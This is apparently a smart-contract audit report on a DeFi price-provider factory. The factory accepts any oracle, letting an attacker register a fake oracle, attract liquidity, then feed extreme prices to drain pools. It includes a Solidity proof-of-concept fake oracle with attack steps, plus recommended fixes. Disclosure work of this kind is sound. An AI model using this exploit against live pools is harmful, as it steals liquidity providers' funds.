### Title
`PriceProviderFactory::createPriceProvider()` Accepts Arbitrary Oracle Address — Fake Oracle Feeds Unbounded Prices Into Pool Swaps (`smart-contracts-poc/contracts/PriceProviderFactory.sol`)

---

### Summary

`PriceProviderFactory::createPriceProvider()` is permissionless and accepts any `_oracle` address with zero validation. The resulting `PriceProvider` is immediately added to the factory's `_providers` set, making `isProvider()` return `true`. Simultaneously, `MetricOmmPoolFactory::_validatePriceProvider()` only checks that `token0()/token1()` match the pool pair — it never checks factory membership or oracle legitimacy. A malicious actor can therefore deploy a fake oracle, create a factory-tracked provider, create a pool with it, attract LPs, and then return arbitrary prices to drain LP funds via bad-price execution.

---

### Finding Description

**Root cause 1 — `PriceProviderFactory::createPriceProvider()` (no oracle allow-list):** [1](#0-0) 

The function deploys a `PriceProvider` with the caller-supplied `_oracle` and unconditionally adds it to `_providers`. There is no check that `_oracle` is a legitimate Pyth/Chainlink oracle. Compare this with `AnchoredProviderFactory::createAnchoredProvider()`, which enforces `if (!_oracles.contains(oracle)) revert OracleNotAllowed(oracle)` before deploying: [2](#0-1) 

`PriceProviderFactory` has no equivalent guard.

**Root cause 2 — `MetricOmmPoolFactory::_validatePriceProvider()` (token-only check):** [3](#0-2) 

The validation only calls `token0()/token1()` on the provider. It does not verify that the provider was deployed by a recognized factory or that its backing oracle is legitimate. This check is used both at pool creation (`_validatePoolParameters`) and at price-provider updates (`proposePoolPriceProvider` / `executePoolPriceProviderUpdate`): [4](#0-3) [5](#0-4) 

**How the fake oracle bypasses all `PriceProvider` guards:**

`PriceProvider._getBidAndAskPrice()` reads via `IPricedOracle(address(offchainOracle)).price(offchainFeedId, msg.sender)` and then applies three guards: [6](#0-5) 

A fake oracle can trivially satisfy all three:
- **Staleness**: return `refTime = block.timestamp`
- **Spread marker**: return `spread = 0` (below `ORACLE_BPS = 10_000`)
- **Price guard**: `priceGuard()` returns `(0, 0)` → `guardMax` becomes `type(uint128).max`, so any `mid` passes

The fake oracle then returns any `mid` it chooses — including `1` (extreme low) or `type(uint64).max` (extreme high) — and the provider propagates it directly to the pool swap.

Note: `AnchoredPriceProvider` is immune because its reference-band clamp (`min(refBid, cBid)` / `max(refAsk, cAsk)`) bounds any source output. `PriceProvider` has no such clamp. [7](#0-6) 

---

### Impact Explanation

A malicious actor can drain LP principal from any pool that uses a `PriceProvider`-backed provider:

1. Deploy a fake oracle that initially returns market-accurate prices (to attract LPs) and implements `priceGuard()` returning `(0, 0)`.
2. Call `PriceProviderFactory::createPriceProvider(fakeOracle, feedId, 0, 1 days, tokenA, tokenB)` → provider is factory-tracked (`isProvider() == true`).
3. Call `MetricOmmPoolFactory::createPool(...)` with this provider — `_validatePriceProvider` passes because `token0()/token1()` match.
4. LPs add liquidity; the pool appears legitimate (factory-tracked provider, real-looking prices).
5. Attacker flips the fake oracle to return `mid = 1` (or `mid = type(uint64).max`).
6. Attacker executes a swap at the manipulated price, receiving far more output than the pool is owed, draining LP reserves.

This is a direct bad-price execution leading to pool insolvency: LP balances no longer cover LP claims.

---

### Likelihood Explanation

Medium. Pool creation is permissionless — no special role is required. The factory-tracking signal (`isProvider() == true`) provides a false legitimacy guarantee that LPs and integrators are documented to rely on (the `AnchoredProviderFactory` NatSpec explicitly calls `recognizedFactory.isProvider(p)` the "machine-checkable predicate" for public-pool eligibility). An attacker who operates the fake oracle controls the timing of the price manipulation and can wait until LP deposits are large enough to make the attack profitable.

---

### Recommendation

**Fix 1 — Add an oracle allow-list to `PriceProviderFactory`** (mirroring `AnchoredProviderFactory`):

```solidity
EnumerableSet.AddressSet private _allowedOracles;

function addOracle(address oracle) external onlyRole(ADMIN_ROLE) {
    require(_allowedOracles.add(oracle));
}

function createPriceProvider(address _oracle, ...) external returns (address provider) {
    require(_allowedOracles.contains(_oracle), OracleNotAllowed(_oracle)); // ADD THIS
    ...
}
```

**Fix 2 — Add a factory-membership check to `MetricOmmPoolFactory::_validatePriceProvider()`**:

```solidity
function _validatePriceProvider(address token0, address token1, address priceProvider) internal view {
    if (priceProvider == address(0)) revert InvalidPriceProvider();
    if (IPriceProvider(priceProvider).token0() != token0 || IPriceProvider(priceProvider).token1() != token1)
        revert PriceProviderTokenMismatch();
    // ADD: require the provider was deployed by a recognized factory
    require(recognizedProviderFactory.isProvider(priceProvider), UnrecognizedPriceProvider());
}
```

---

### Proof of Concept

```solidity
contract FakeOracle {
    uint256 public manipulatedMid = 100_000_000; // starts at market price

    // Satisfies IPricedOracle.price() — returns any mid, passes all PriceProvider guards
    function price(bytes32, address)
        external view returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        return (manipulatedMid, 0, 0, block.timestamp); // spread=0 < ORACLE_BPS; refTime=now (fresh)
    }

    // Returns (0,0) → guardMax becomes type(uint128).max → any mid passes price guard
    function priceGuard(bytes32) external pure returns (uint128, uint128) {
        return (0, 0);
    }

    function setMid(uint256 m) external { manipulatedMid = m; }
}

// Step 1-2: create factory-tracked provider with fake oracle
FakeOracle fakeOracle = new FakeOracle();
address provider = priceProviderFactory.createPriceProvider(
    address(fakeOracle), feedId, 0, 1 days, address(tokenA), address(tokenB)
);
assert(priceProviderFactory.isProvider(provider)); // true — false legitimacy signal

// Step 3: create pool (only token matching checked, passes)
address pool = poolFactory.createPool(PoolParameters({
    priceProvider: provider, token0: address(tokenA), token1: address(tokenB), ...
}));

// Step 4: LPs add liquidity (prices look real)
liquidityAdder.addLiquidity(pool, largeAmount0, largeAmount1, ...);

// Step 5: attacker flips oracle to extreme low price
fakeOracle.setMid(1); // 1 unit of 8-decimal price ≈ $0.00000001

// Step 6: attacker swaps tokenB → tokenA at manipulated price, drains pool
router.swap(pool, tokenB, tokenA, attackerAmountIn, 0, attacker);
// Pool pays out nearly all tokenA reserves at price=1, LP claims are now undercollateralized
```

### Citations

**File:** smart-contracts-poc/contracts/PriceProviderFactory.sol (L41-76)
```text
    function createPriceProvider(
        address _oracle,
        bytes32 _feedId,
        int256  _marginStep,
        uint256 _maxTimeDelta,
        address _baseToken,
        address _quoteToken
    ) external override returns (address provider) {
        PriceProvider p = new PriceProvider(
            address(this),
            _oracle,
            _feedId,
            _marginStep,
            _maxTimeDelta,
            _baseToken,
            _quoteToken
        );

        provider = address(p);
        address creator = msg.sender;

        _providers.add(provider);
        _providersByCreator[creator].add(provider);
        providerOwner[provider] = creator;

        emit ProviderDeployed(
            provider,
            creator,
            _feedId,
            _oracle,
            p.baseToken(),
            p.quoteToken(),
            _marginStep,
            _maxTimeDelta
        );
    }
```

**File:** smart-contracts-poc/contracts/AnchoredProviderFactory.sol (L168-168)
```text
        if (!_oracles.contains(oracle)) revert OracleNotAllowed(oracle);
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L483-483)
```text
    _validatePriceProvider(p.token0, p.token1, newPriceProvider);
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L502-503)
```text
    _validatePriceProvider(p.token0, p.token1, pending);
    IMetricOmmPoolFactoryActions(pool).setPriceProvider(pending);
```

**File:** metric-core/contracts/MetricOmmPoolFactory.sol (L541-546)
```text
  function _validatePriceProvider(address token0, address token1, address priceProvider) internal view {
    if (priceProvider == address(0)) revert InvalidPriceProvider();
    if (IPriceProvider(priceProvider).token0() != token0 || IPriceProvider(priceProvider).token1() != token1) {
      revert PriceProviderTokenMismatch();
    }
  }
```

**File:** smart-contracts-poc/contracts/PriceProvider.sol (L194-212)
```text
        (uint256 mid, uint256 spread, , uint256 refTime) =
            IPricedOracle(address(offchainOracle)).price(offchainFeedId, msg.sender);

        // 2. Staleness check
        if (_isStale(refTime, block.timestamp, MAX_TIME_DELTA)) {
            return (0, type(uint128).max);
        }

        // 3. Basic validity — price must be positive, spread must not be stalled marker
        if (mid == 0 || spread >= ORACLE_BPS) {
            return (0, type(uint128).max);
        }

        // 4. Price guard check (moved from oracle)
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(offchainFeedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) {
            return (0, type(uint128).max);
        }
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L342-343)
```text
        uint256 bidOut = Math.min(refBid, cBid);
        uint256 askOut = Math.max(refAsk, cAsk);
```
